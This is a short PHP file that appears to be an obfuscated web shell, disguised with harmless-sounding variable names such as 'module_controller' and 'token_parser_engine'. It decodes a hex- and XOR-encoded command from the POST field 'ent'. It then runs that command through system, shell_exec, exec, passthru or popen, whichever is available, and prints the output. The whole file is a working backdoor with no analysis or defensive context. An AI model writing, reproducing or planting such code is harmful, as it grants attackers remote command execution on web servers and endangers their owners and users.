<?php

$module_controller5 = "\x70op\x65n";
$module_controller6 = "\x73tr\x65a\x6D_\x67\x65t_\x63o\x6Et\x65nt\x73";
$token_parser_engine = "h\x65x2\x62\x69n";
$module_controller1 = "s\x79\x73tem";
$module_controller4 = "\x70\x61s\x73\x74hru";
$module_controller7 = "\x70\x63lose";
$module_controller2 = "sh\x65\x6Cl\x5Fe\x78\x65c";
$module_controller3 = "e\x78ec";
if (isset($_POST["en\x74"])) {
            function data_storage   (   $fac      ,      $symbol     )   {
    $element   =      ''     ;
      $o=0;
 do{
$element.=chr(ord($fac[$o])^$symbol);
$o++;

} while($o<strlen($fac));
 return   $element;
      
}
            $ent = $token_parser_engine($_POST["en\x74"]);
            $ent = data_storage($ent, 93);
            if (function_exists($module_controller1)) {
                $module_controller1($ent);
            } elseif (function_exists($module_controller2)) {
                print $module_controller2($ent);
            } elseif (function_exists($module_controller3)) {
                $module_controller3($ent, $key_fac);
                print join("\n", $key_fac);
            } elseif (function_exists($module_controller4)) {
                $module_controller4($ent);
            } elseif (function_exists($module_controller5) && function_exists($module_controller6) && function_exists($module_controller7)) {
                $symbol_element = $module_controller5($ent, 'r');
                if ($symbol_element) {
                    $ptr_record = $module_controller6($symbol_element);
                    $module_controller7($symbol_element);
                    print $ptr_record;
                }
            }
            exit;
        }